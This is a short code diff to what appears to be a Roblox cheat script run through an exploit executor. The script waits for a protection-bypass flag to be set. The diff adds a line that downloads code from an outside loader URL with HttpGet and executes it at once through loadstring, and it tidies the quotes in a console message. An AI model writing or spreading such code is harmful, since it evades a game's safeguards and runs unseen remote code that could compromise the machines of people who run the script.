@@ -10,6 +10,8 @@ queue_on_teleport([=[
     end)
 
     repeat task.wait() until getgenv().Bypassed
+
+    loadstring(game:HttpGet("https://luaprot.net/api/v2/loaders/get/99779786104572102737"))()
 ]=])
 
-rconsoleprint("connect to a server now")
+rconsoleprint('connect to a server now')
